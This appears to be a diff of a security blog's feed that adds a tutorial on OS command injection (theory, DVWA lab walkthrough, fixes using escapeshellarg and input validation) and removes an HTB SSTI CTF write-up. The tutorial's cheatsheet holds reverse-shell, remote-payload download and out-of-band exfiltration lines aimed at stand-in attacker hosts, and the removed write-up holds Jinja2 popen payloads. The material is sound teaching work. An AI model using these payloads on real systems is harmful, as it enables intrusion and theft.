@@ -3,12 +3,205 @@
     <title>Offens!ve Blogs - Sakibul Ali Khan</title>
     <link href="https://sakibulalikhan.pages.dev/feed.xml" rel="self" />
     <link href="https://sakibulalikhan.pages.dev" />
-    <updated>2024-02-11T17:08:18+06:00</updated>
+    <updated>2024-02-12T05:12:16+06:00</updated>
     <author>
         <name>Sakibul Ali Khan</name>
     </author>
     <id>https://sakibulalikhan.pages.dev</id>
 
+    <entry>
+        <title>Exploring OS Command Injection: Understanding and Hands-On Practice</title>
+        <author>
+            <name>Sakibul Ali Khan</name>
+        </author>
+        <link href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html"/>
+        <id>https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html</id>
+        <media:content url="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" medium="image" />
+            <category term="Web Security"/>
+            <category term="Pentesting"/>
+            <category term="OWASP 10"/>
+            <category term="Command Injection"/>
+
+        <updated>2024-02-12T05:12:16+06:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" />
+                    Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" class="type:primaryImage" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" /></p>
+                <div class="cl-preview-section">
+<p>Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll delve into the intricacies of OS Command Injection, providing both theoretical insights and practical demonstrations to equip pentesters and bug hunters with the knowledge and skills needed to identify and mitigate this vulnerability effectively. Let’s dive in!</p>
+</div>
+<div class="cl-preview-section">
+<h2 id="part-1-understanding-os-command-injection">Part 1: Understanding OS Command Injection</h2>
+</div>
+<div class="cl-preview-section">
+<h3 id="what-is-os-command-injection">What is OS Command Injection?</h3>
+</div>
+<div class="cl-preview-section">
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="597" height="313" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-lg.png 1024w"></figure>
+<p>OS Command Injection is a type of vulnerability where attackers can execute arbitrary commands on the underlying operating system by manipulating user-supplied input that is passed to system shell commands. This vulnerability arises when web applications incorporate user input directly into command strings without proper validation or sanitization.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="impact-of-os-command-injection">Impact of OS Command Injection</h3>
+</div>
+<div class="cl-preview-section">
+<p>The consequences of OS Command Injection can be severe, potentially leading to unauthorized access, data exfiltration, or even full control over the target system. Attackers can leverage this vulnerability to execute commands with the privileges of the vulnerable application, posing significant risks to the security and integrity of the system.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="distinguishing-os-command-injection-from-other-injection-attacks">Distinguishing OS Command Injection from Other Injection Attacks</h3>
+</div>
+<div class="cl-preview-section">
+<p>It’s essential to differentiate OS Command Injection from other injection attacks, such as Code Injection. While Code Injection involves injecting and executing arbitrary code within the application context, OS Command Injection focuses on manipulating system commands executed by the underlying operating system.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="real-world-examples">Real-World Examples</h3>
+</div>
+<div class="cl-preview-section">
+<p>We explore real-world instances of OS Command Injection vulnerabilities, including notable cases like CVE-2021-25296 in NagiosXI and CVE-2023-29084 in ManageEngine ADManagerPlus. These examples underscore the critical importance of identifying and addressing OS Command Injection vulnerabilities to mitigate security risks.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="preventive-measures">Preventive Measures</h3>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="525" height="246" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-lg.png 1024w"></figure>
+</div>
+<div class="cl-preview-section">
+<p>Effective prevention of OS Command Injection involves implementing robust input validation, avoiding direct invocation of system shell commands whenever possible, and utilizing safe APIs for handling user input. We discuss various preventive strategies and highlight the importance of proactive security measures in mitigating this vulnerability.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="command-injection-cheatsheet">Command Injection Cheatsheet</h3>
+</div>
+<div class="cl-preview-section">
+<pre class="language-bash line-numbers"><code>--------------------------------------------------------------------
+Special Characters
+&amp;
+;
+Newline (0x0a or \n)
+&amp;&amp;
+|
+||
+command `
+$(command )
+--------------------------------------------------------------------
+Useful Commands: Linux
+whoami
+ifconfig
+ls
+uname -a
+--------------------------------------------------------------------
+Useful Commands: Windows
+whoami
+ipconfig
+dir
+ver
+--------------------------------------------------------------------
+Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id 
+ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id 
+ls %0A id
+--------------------------------------------------------------------
+Time Delay Commands
+&amp; ping -c 10 127.0.0.1 &amp;
+--------------------------------------------------------------------
+Redirecting output
+&amp; whoami &gt; /var/www/images/output.txt &amp;
+--------------------------------------------------------------------
+OOB (Out Of Band) Exploitation
+&amp; nslookup attacker-server.com &amp;
+&amp; nslookup `whoami`.attacker-server.com &amp;
+-------------------------------------------------------------------
+WAF bypasses
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
+/tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
+vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+--------------------------------------------------------------------</code></pre>
+</div>
+<div class="cl-preview-section">
+<div class="cl-preview-section">
+<h2 id="part-2-hands-on-practical-demonstration">Part 2: Hands-On Practical Demonstration</h2>
+</div>
+<div class="cl-preview-section">
+<p>In this section, we do a hands-on lab solutions to demonstrate OS Command Injection techniques and detection methods. Pentesters and bug hunters can gain valuable insights into identifying and exploiting OS Command Injection vulnerabilities using practical scenarios.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="616" height="589" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-lg.png 1024w"></figure>
+<p>In this blog post, we'll explore Command Injection Vulnerabilities using DVWA version 1.10 as our playground. I've structured our exploration into two distinct phases: Attack and Securing The Code. You might wonder why I've started with the attack phase first. Well, since we have access to the source code from the beginning (assuming this is white-box testing), it makes sense to dive straight into demonstrating the attack. Later, we'll dissect the source code to understand its workings and discuss preventive measures. Let's begin by exploring the attack phase.</p>
+<h2 id="attack-phase">1. Attack Phase:</h2>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="616" height="591" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-lg.png 1024w"></figure>
+<p>In the Command Injection tab, the system prompts the user for input and specifically requests an IP address to be entered into the designated form field. This input mechanism serves as the entry point for potential exploitation through Command Injection.</p>
+<h3 id="e04b" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: Low</h3>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="385" height="319" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-lg.png 1024w"></figure>
+<p>From the provided source code snippet, it's evident that the system lacks proper input validation. This means users can input any arbitrary integer or character instead of an actual IP Address. This oversight opens up the system to exploitation, as attackers can utilize various operators, also known as meta-characters, to deceive the shell into executing arbitrary commands.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="939" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-lg.png 1024w"></figure>
+<p>Once the shell executes <code>1.1.1.1;</code>, it proceeds to execute <code>pwd</code> as if it were part of the same shell command. This behavior occurs because the shell interprets the entire input string as a single command.</p>
+<h3 id="8d7c" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: Medium</h3>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="539" height="422" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-lg.png 1024w"></figure>
+<p>In the provided source code snippet, you can input a random integer or any character instead of the expected IP Address. Unfortunately, the system fails to validate user input, allowing anything to be entered. Additionally, the system substitutes the characters <code>&amp;&amp;</code> and <code>;</code>, replacing them with blanks in the array through a substitution function. However, you can still employ other operators, known as meta-characters, to deceive the shell into executing arbitrary commands.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="942" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-lg.png 1024w"></figure>
+<p>Once the shell executes <code>1.1.1.1 &amp;&amp;</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 &amp;&amp;</code> as part of a single command. Consequently, the shell believes there is another command pending execution, and <code>pwd</code> is executed accordingly.</p>
+<h3 id="e69d" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: High</h3>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="546" height="519" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-lg.png 1024w"></figure>
+<p>In the provided source code, you can input a random integer or any character instead of the expected IP Address because the system lacks proper validation of user input. Consequently, users can input anything. Additionally, the admin has implemented a trim function to remove any extra spaces in the first array [0] and the last array[∞].</p>
+<p>Moreover, the system substitutes several characters, triggering a substitutions function that replaces the character with a blank in the array when inputted. However, users can only use two operators, also known as meta-characters, to manipulate the shell into executing arbitrary commands. Specifically, users can utilize <code>|</code> without any space afterward, as the system will replace <code>|</code> if extra space is used. Similarly, users can employ <code>||</code>  for this purpose.</p>
+<p><strong>But how does it work when the operator is supposedly filtered?</strong></p>
+<p>When you input <code>1.1.1.1 | pwd</code>, the additional <code>|</code> is replaced with a blank in the array. Consequently, the final payload appears as <code>1.1.1.1 | pwd</code>.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="941" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-lg.png 1024w"></figure>
+<p>After the shell executes <code>1 |</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 |</code> as part of a single command. Therefore, the shell believes there is another command pending execution, leading to the execution of <code>pwd</code>.</p>
+<h3 id="c63b" class="ny nz gr be oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bj">2. Securing The Code</h3>
+<p>To enhance the security of this Command Injection Code, there are two crucial steps you can take:</p>
+<ol>
+<li><strong>Escaping Shell Arguments</strong></li>
+</ol>
+<p>In each level of source code complexity, the <code>shell_exec()</code> PHP function is utilized without incorporating the <code>escapeshellarg()</code> function. This practice should be rectified to bolster security measures.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="720" height="388" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-lg.png 1024w"></figure>
+<p>By implementing <code>escapeshellarg()</code>, every meta-character within a string is automatically escaped, and the string itself is encapsulated within quotes. This ensures that the string can be safely passed directly to the shell, where it will be treated as a single, secure argument.</p>
+<pre class="language-php line-numbers"><code>&lt;?php
+
+// Bat Input
+if(isset($_POST['Submit'])) {
+    $target = $_REQUEST['ip'];
+
+    // Determine DS and execute the ping commend.
+    if(stristr(php_uname('s'), 'Windows NT')){
+        $cmd = shell_exec('ping ' . $target);
+    } else {
+        $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));
+    }
+
+    // Feedback for the end user
+    $html .= "&lt;pre&gt; {$cmd}&lt;/pre&gt;";
+
+}
+
+?&gt;</code></pre>
+<p>Now, even the Lowest Difficulty level is fortified against vulnerabilities. It's worth noting that by incorporating <code>escapeshellarg()</code>, the Low, Medium, and High Difficulty levels can achieve heightened security without the need for additional validation. For instance, even if the user inputs something other than an IP Address format, such as "test", the system remains secure.</p>
+<p><span class="nc gs">2.</span><strong class="nc gs"> Validate user input</strong> </p>
+<p>Upon reviewing each source code difficulty, it becomes apparent that the primary objective is to ping a designated IP Address. However, in the Low, Medium, and High Difficulty levels, the failure to validate user input permits users to input arbitrary values, such as characters, instead of adhering to the expected IP Address format. Consequently, it becomes imperative to implement user input validation.</p>
+<p>When user input validation is enforced, any attempt to input values other than the expected IP Address format will be rejected by the system, triggering an error message such as "You have entered an invalid IP." This approach ensures that all input is rigorously validated, thereby sanitizing any potentially malicious input.</p>
+</div>
+<div class="cl-preview-section">
+<h2 id="conclusion">Conclusion</h2>
+</div>
+<div class="cl-preview-section">
+<p>OS Command Injection poses significant security risks to web applications, making it imperative for security professionals to understand, detect, and mitigate this vulnerability effectively. By combining theoretical understanding with hands-on practical demonstrations, pentesters and bug hunters can enhance their skills in identifying and addressing OS Command Injection vulnerabilities, ultimately strengthening the overall security posture of web applications.</p>
+</div>
+<h3 id="references-and-further-reading">References and Further Reading:</h3>
+</div>
+<div class="cl-preview-section">
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77 Command Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78 OS Command Injection</a></li>
+<li><a href="https://owasp.org/www-community/attacks/Command_Injection">OWASP Command Injection</a></li>
+<li><a href="https://portswigger.net/web-security/os-command-injection">Portswigger Web Security Academy Materials &amp; Labs</a></li>
+</ul>
+<p> </p>
+</div>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide</title>
         <author>
@@ -1860,81 +2053,6 @@ cd PentestGPT
 </figure>
 <p id="4f95" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hurrah!!! we got the flag that we are seeking :))</p>
 </div>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>Templated — HTB Web Challenge Writeup</title>
-        <author>
-            <name>Sakibul Ali Khan</name>
-        </author>
-        <link href="https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html"/>
-        <id>https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html</id>
-        <media:content url="https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg" medium="image" />
-            <category term="Web Security"/>
-            <category term="Pentesting"/>
-            <category term="HackTheBox"/>
-            <category term="CTF Writeups"/>
-
-        <updated>2024-01-07T10:47:34+06:00</updated>
-            <summary>
-                <![CDATA[
-                        <img src="https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg" alt="Templated — HTB Web Challenge Writeup" />
-                    CHALLENGE DESCRIPTION First Start Instance and then you are provided with an web address in the form of &lt;ip&gt;:&lt;port&gt;. Copy it and open it in another tab or&hellip;
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg" class="type:primaryImage" alt="Templated — HTB Web Challenge Writeup" /></p>
-                <p id="7abf" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj aom dropcap" data-selectable-paragraph=""><span class="l aon aoo aop bn aoq aor aos aot aou dj">C</span>HALLENGE DESCRIPTION</p>
-<h2 id="8d9c" class="ze zf tu be zg la zh do ld le zi dq lh li zj lj lm ln zk lo lr ls zl lt lw zm bj" data-selectable-paragraph="">Can you exploit this simple mistake?</h2>
-<p id="e467" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">First Start Instance and then you are provided with an <code class="ff abm abn abo abp b">web address</code> in the form of <code class="ff abm abn abo abp b">&lt;ip&gt;:&lt;port&gt;</code>. Copy it and open it in another tab or browser. In my case it was <a class="af rn" href="http://134.209.18.1:30563/" rel="noopener ugc nofollow" target="_blank">http://134.209.18.1:30563</a></p>
-<p id="eea7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now let’s visit the webpage:</p>
-<figure class="yq yr ys yt yu yv kl km paragraph-image">
-<div class="acf acg dj ach bg aci" tabindex="0" role="button">
-<div class="kl km aov">
-<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*1LXjZNafDz94euePR9ZFnw.png" alt="HTB Web Challenge Templated writeup" width="700" height="300" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="0d94" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The web app shows a message <code class="ff abm abn abo abp b">Site still under construction</code><br><code class="ff abm abn abo abp b">Proudly powered by Flask/Jinja2</code></p>
-<p id="3097" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">There is a hint do you notice? Yeah, you notice… Here the web app technology is Flask/Jinja2. (It is a hint for us.)</p>
-<p id="8025" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">If you search for <strong class="ly kz">Flask/Jinja2 exploit</strong> then you can find it has SSTI (Server Side Template Injection)</p>
-<p id="b122" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We can indicate possible SSTI by adding <strong class="ly kz"><em class="abt">{{ 5* 5 }}</em></strong> to the parameter search, we can see that the template engine evaluates the mathematical expression and the application responds with <strong class="ly kz"><em class="abt">25</em></strong>.</p>
-<figure class="yq yr ys yt yu yv kl km paragraph-image">
-<div class="acf acg dj ach bg aci" tabindex="0" role="button">
-<div class="kl km aov">
-<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*xko-JwNVbZLFqyi9rFhlTg.png" alt="" width="700" height="300" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<h3 id="f449" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Now we are going to exploit this using SSTI</h3>
-<p id="3fc5" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Use the bellow payloads to begin our exploitation to get the flag!</p>
-<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0d2a" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'id'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
-<figure class="yq yr ys yt yu yv kl km paragraph-image">
-<div class="acf acg dj ach bg aci" tabindex="0" role="button">
-<div class="kl km aov">
-<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*AijyueE1MzBurK9MK3tGhA.png" alt="HTB Web Challenge Templated Writeup" width="700" height="177" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="3709" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'ls'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
-<figure class="yq yr ys yt yu yv kl km paragraph-image">
-<div class="acf acg dj ach bg aci" tabindex="0" role="button">
-<div class="kl km aow">
-<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*1Dnd-7JeY7Z2ODWjTWceqA.png" alt="HTB Web Challenge Templated" width="700" height="148" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="52d1" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'cat flag.txt'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
-<figure class="yq yr ys yt yu yv kl km paragraph-image">
-<div class="acf acg dj ach bg aci" tabindex="0" role="button">
-<div class="kl km aox">
-<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*pefVP-Tw4pCXwTM85ByqXw.png" alt="" width="700" height="177" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="9bf3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hurrah!!! We found the flag. This is where our challenge finished :))</p>
             ]]>
